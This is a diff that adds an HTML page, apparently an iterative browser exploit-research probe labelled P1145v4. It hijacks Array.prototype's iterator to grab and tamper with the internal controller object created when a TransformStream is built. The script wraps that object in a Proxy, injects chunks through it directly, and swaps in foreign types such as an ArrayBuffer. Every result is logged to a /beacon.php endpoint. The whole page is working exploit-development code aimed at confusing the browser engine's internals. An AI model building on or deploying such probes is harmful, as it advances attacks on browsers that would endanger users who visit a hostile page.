@@ -1,0 +1,317 @@
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>P1145v4</title>
+<style>*{margin:0;padding:0;box-sizing:border-box}body{background:#0a0a0f;color:#c8ffc8;font:11px/1.4 monospace;padding:10px;min-height:100vh}#log{white-space:pre-wrap;word-break:break-all}.ok{color:#6f6}.fail{color:#f66}.ptr{color:#f6f}.info{color:#6cf}.phase{color:#fff;font-size:13px;font-weight:bold;margin:6px 0}.win{color:#0f0;font-weight:bold;font-size:14px}</style>
+</head><body><div id="log"></div>
+<script>
+var L=document.getElementById('log');
+function log(c,m){var d=document.createElement('div');d.className=c;d.textContent=m;L.appendChild(d);}
+function B(t,d){try{new Image().src='/beacon.php?tag='+encodeURIComponent(t)+'&data='+encodeURIComponent(d||'')+'&_='+Math.random();}catch(e){}}
+
+log('phase','=== P1145v4: SLOT-0 SUBSTITUTION (the Object) ===');
+log('info','P1145v3 revealed: Pass1=[RS,WS](len=2), Pass2=[Obj,RS,WS](len=3)');
+log('info','P1145v2 was WRONG: capture on len=3 never matched pass1!');
+log('info','Target: substitute the Object at slot 0 of pass 2');
+B('P1145V4-START','t='+Date.now());
+
+var origIter=Array.prototype[Symbol.iterator];
+
+// ===== SECTION A: Deep inspect the Object at pass2[0] =====
+log('phase','--- A: Inspect pass2 slot 0 Object ---');
+var slot0Info={};
+var passA=0;
+
+Array.prototype[Symbol.iterator]=function(){
+  passA++;
+  if(passA===2 && this.length===3){
+    var obj=this[0];
+    slot0Info.type=typeof obj;
+    try{slot0Info.ctor=obj.constructor.name;}catch(e){slot0Info.ctor='?';}
+    try{slot0Info.proto=Object.getPrototypeOf(obj).constructor.name;}catch(e){slot0Info.proto='?';}
+    // Enumerate all properties
+    var props=[];
+    try{props=Object.getOwnPropertyNames(obj);}catch(e){}
+    slot0Info.ownProps=props.join(',');
+    // Check known stream/controller methods
+    slot0Info.hasEnqueue=(typeof obj.enqueue);
+    slot0Info.hasError=(typeof obj.error);
+    slot0Info.hasTerminate=(typeof obj.terminate);
+    slot0Info.hasDesiredSize=(typeof obj.desiredSize);
+    slot0Info.hasReadable=(typeof obj.readable);
+    slot0Info.hasWritable=(typeof obj.writable);
+    slot0Info.hasTransform=(typeof obj.transform);
+    slot0Info.hasFlush=(typeof obj.flush);
+    slot0Info.hasStart=(typeof obj.start);
+    // Try to read desiredSize
+    try{slot0Info.dsValue=obj.desiredSize;}catch(e){slot0Info.dsValue='ERR:'+e.message;}
+    // Check if it's the TransformStream itself
+    try{slot0Info.isTS=(obj instanceof TransformStream);}catch(e){slot0Info.isTS='?';}
+    // String representation
+    try{slot0Info.str=String(obj).substring(0,80);}catch(e){slot0Info.str='ERR';}
+    try{slot0Info.json=JSON.stringify(obj).substring(0,80);}catch(e){slot0Info.json='ERR';}
+    // Check prototype chain methods
+    var protoMethods=[];
+    try{
+      var p=Object.getPrototypeOf(obj);
+      if(p && p!==Object.prototype){
+        protoMethods=Object.getOwnPropertyNames(p);
+      }
+    }catch(e){}
+    slot0Info.protoMethods=protoMethods.join(',');
+  }
+  return origIter.call(this);
+};
+
+try{
+  passA=0;
+  var tsA=new TransformStream();
+  log('ok','Inspection complete');
+}catch(e){log('fail','Error: '+e.message);}
+Array.prototype[Symbol.iterator]=origIter;
+
+log('info','type='+slot0Info.type+' ctor='+slot0Info.ctor+' proto='+slot0Info.proto);
+log('info','ownProps: '+slot0Info.ownProps);
+log('info','protoMethods: '+slot0Info.protoMethods);
+log('info','enqueue='+slot0Info.hasEnqueue+' error='+slot0Info.hasError+' terminate='+slot0Info.hasTerminate);
+log('info','desiredSize='+slot0Info.hasDesiredSize+' (value='+slot0Info.dsValue+')');
+log('info','readable='+slot0Info.hasReadable+' writable='+slot0Info.hasWritable);
+log('info','transform='+slot0Info.hasTransform+' flush='+slot0Info.hasFlush+' start='+slot0Info.hasStart);
+log('info','isTS='+slot0Info.isTS+' str='+slot0Info.str+' json='+slot0Info.json);
+B('P1145V4-SLOT0','ctor='+slot0Info.ctor+'|proto='+slot0Info.proto+'|props='+slot0Info.ownProps+'|enq='+slot0Info.hasEnqueue+'|ds='+slot0Info.dsValue);
+B('P1145V4-SLOT0B','protoM='+slot0Info.protoMethods+'|transform='+slot0Info.hasTransform+'|isTS='+slot0Info.isTS);
+
+// ===== SECTION B: Substitute slot 0 with instrumented proxy =====
+log('phase','--- B: Slot-0 substitution with Proxy ---');
+var proxyCalls=[];
+var passB=0;
+var realSlot0=null;
+
+Array.prototype[Symbol.iterator]=function(){
+  passB++;
+  if(passB===2 && this.length===3){
+    realSlot0=this[0];
+    // Create a Proxy that wraps the real object but logs all access
+    var proxy=new Proxy(this[0],{
+      get:function(target,prop,receiver){
+        proxyCalls.push({op:'get',prop:String(prop)});
+        if(proxyCalls.length<=20){
+          log('info','Proxy.get: '+String(prop));
+        }
+        return Reflect.get(target,prop,receiver);
+      },
+      set:function(target,prop,value,receiver){
+        proxyCalls.push({op:'set',prop:String(prop),val:String(value).substring(0,30)});
+        log('win','Proxy.set: '+String(prop)+' = '+String(value).substring(0,30));
+        B('P1145V4-PROXY-SET','prop='+prop+'|val='+String(value).substring(0,50));
+        return Reflect.set(target,prop,value,receiver);
+      },
+      apply:function(target,thisArg,args){
+        proxyCalls.push({op:'apply',args:args.length});
+        log('win','Proxy.apply with '+args.length+' args');
+        return Reflect.apply(target,thisArg,args);
+      }
+    });
+    return [proxy, this[1], this[2]][Symbol.iterator]();
+  }
+  return origIter.call(this);
+};
+
+var bResult='?';
+var tsB=null;
+try{
+  passB=0;
+  proxyCalls=[];
+  tsB=new TransformStream({
+    transform:function(chunk,ctrl){ctrl.enqueue(chunk+'_X');}
+  });
+  bResult='OK';
+  log('ok','Proxy-wrapped slot0: ACCEPTED!');
+}catch(e){
+  bResult='ERR:'+e.message.substring(0,60);
+  log('fail','Proxy error: '+e.message);
+}
+B('P1145V4-PROXY-RESULT',bResult+'|calls='+proxyCalls.length);
+Array.prototype[Symbol.iterator]=origIter;
+
+// Log what was accessed during construction
+var getCounts={};
+for(var i=0;i<proxyCalls.length;i++){
+  var c=proxyCalls[i];
+  if(c.op==='get'){getCounts[c.prop]=(getCounts[c.prop]||0)+1;}
+}
+var getStr=[];
+for(var k in getCounts) getStr.push(k+'('+getCounts[k]+')');
+log('info','Construction accessed: '+getStr.join(', '));
+B('P1145V4-CONSTRUCT-ACCESS',getStr.join(','));
+
+// Write data through and monitor what the proxy intercepts
+if(tsB){
+  log('phase','--- B2: Write through proxy-wrapped stream ---');
+  var preWriteCalls=proxyCalls.length;
+  try{
+    var w=tsB.writable.getWriter();
+    w.write('TEST_1');
+    w.write('TEST_2');
+    w.close();
+
+    var rdr=tsB.readable.getReader();
+    function readLoop(){
+      rdr.read().then(function(res){
+        if(!res.done){
+          log('ok','Read: '+res.value);
+          B('P1145V4-READ','val='+res.value);
+          readLoop();
+        }else{
+          var postWriteCalls=proxyCalls.length;
+          var newCalls=postWriteCalls-preWriteCalls;
+          log('info','New proxy calls during write: '+newCalls);
+
+          // Report all proxy calls after construction
+          var writeSets=proxyCalls.filter(function(c){return c.op==='set';});
+          var writeGets=proxyCalls.slice(preWriteCalls).filter(function(c){return c.op==='get';});
+          log('info','Sets during write: '+writeSets.length);
+          if(writeSets.length>0){
+            log('win','!!! PROXY SET CALLS DURING WRITE !!!');
+            for(var i=0;i<writeSets.length;i++){
+              log('win','  SET '+writeSets[i].prop+' = '+writeSets[i].val);
+            }
+          }
+          B('P1145V4-WRITE-PROXY','newCalls='+newCalls+'|sets='+writeSets.length+'|gets='+writeGets.length);
+          doSectionC();
+        }
+      },function(e){
+        log('fail','Read err: '+e);
+        doSectionC();
+      });
+    }
+    readLoop();
+  }catch(e){
+    log('fail','Write err: '+e.message);
+    B('P1145V4-WRITE-ERR',e.message);
+    doSectionC();
+  }
+}else{
+  doSectionC();
+}
+
+function doSectionC(){
+  // ===== SECTION C: Direct slot-0 reference + manipulation =====
+  log('phase','--- C: Capture and manipulate slot-0 directly ---');
+
+  var captured0=null;
+  var passC=0;
+
+  Array.prototype[Symbol.iterator]=function(){
+    passC++;
+    if(passC===2 && this.length===3) captured0=this[0];
+    return origIter.call(this);
+  };
+
+  var tsC=null;
+  try{
+    passC=0;
+    tsC=new TransformStream();
+  }catch(e){}
+  Array.prototype[Symbol.iterator]=origIter;
+
+  if(captured0){
+    log('ok','Captured slot-0 object');
+
+    // Try direct property manipulation
+    var tests=[
+      {name:'enumerate',fn:function(){return Object.keys(captured0);}},
+      {name:'getOwnDescs',fn:function(){return JSON.stringify(Object.getOwnPropertyDescriptors(captured0)).substring(0,200);}},
+      {name:'frozen',fn:function(){return Object.isFrozen(captured0);}},
+      {name:'sealed',fn:function(){return Object.isSealed(captured0);}},
+      {name:'extensible',fn:function(){return Object.isExtensible(captured0);}},
+    ];
+
+    for(var i=0;i<tests.length;i++){
+      var t=tests[i];
+      try{
+        var r=t.fn();
+        log('ok',t.name+': '+JSON.stringify(r));
+        B('P1145V4-MANIP-'+t.name,JSON.stringify(r).substring(0,100));
+      }catch(e){
+        log('fail',t.name+': '+e.message);
+        B('P1145V4-MANIP-'+t.name,'ERR:'+e.message.substring(0,60));
+      }
+    }
+
+    // Try adding a property to see if it's a C++ wrapper or plain JS
+    try{
+      captured0.__test=42;
+      log('info','Added __test: '+captured0.__test);
+      B('P1145V4-ADDPROP','added='+captured0.__test);
+    }catch(e){
+      log('fail','Cannot add prop: '+e.message);
+    }
+
+    // If it has enqueue, try calling it directly
+    if(typeof captured0.enqueue === 'function'){
+      try{
+        captured0.enqueue('INJECTED');
+        log('win','!!! DIRECT ENQUEUE ON CAPTURED CONTROLLER !!!');
+        B('P1145V4-INJECT','enqueue=OK');
+        // Read from tsC
+        if(tsC){
+          var rC=tsC.readable.getReader();
+          rC.read().then(function(res){
+            log('win','Injected read: '+(res.done?'done':res.value));
+            B('P1145V4-INJECT-READ',res.done?'done':'val='+res.value);
+          });
+        }
+      }catch(e){
+        log('fail','Direct enqueue failed: '+e.message);
+        B('P1145V4-INJECT-ERR',e.message);
+      }
+    }
+  }else{
+    log('fail','No slot-0 captured');
+  }
+
+  // ===== SECTION D: Replace slot0 with COMPLETELY different object types =====
+  log('phase','--- D: Substitute slot0 with different types ---');
+  var typeTests=[
+    {name:'plainObj',make:function(){return {};}},
+    {name:'array',make:function(){return [1,2,3];}},
+    {name:'map',make:function(){return new Map();}},
+    {name:'weakRef',make:function(){return new WeakRef({});}},
+    {name:'promise',make:function(){return Promise.resolve(42);}},
+    {name:'AB192',make:function(){return new ArrayBuffer(192);}},
+    {name:'number',make:function(){return 42;}},
+    {name:'string',make:function(){return 'hello';}},
+    {name:'null',make:function(){return null;}},
+  ];
+
+  for(var ti=0;ti<typeTests.length;ti++){
+    var tt=typeTests[ti];
+    var passD=0;
+    Array.prototype[Symbol.iterator]=function(){
+      passD++;
+      if(passD===2 && this.length===3){
+        try{
+          var fake=tt.make();
+          return [fake, this[1], this[2]][Symbol.iterator]();
+        }catch(e){return origIter.call(this);}
+      }
+      return origIter.call(this);
+    };
+
+    var dResult='?';
+    try{
+      passD=0;
+      var tsD=new TransformStream();
+      dResult='OK';
+    }catch(e){
+      dResult='ERR:'+e.message.substring(0,40);
+    }
+    log(dResult==='OK'?'win':'fail','slot0='+tt.name+': '+dResult);
+    B('P1145V4-TYPE-'+tt.name,dResult);
+    Array.prototype[Symbol.iterator]=origIter;
+  }
+
+  setTimeout(function(){
+    B('P1145V4-DONE','proxy='+bResult+'|proxyCalls='+proxyCalls.length);
+    log('phase','=== P1145v4 COMPLETE ===');
+  },500);
+}
+</script></body></html>
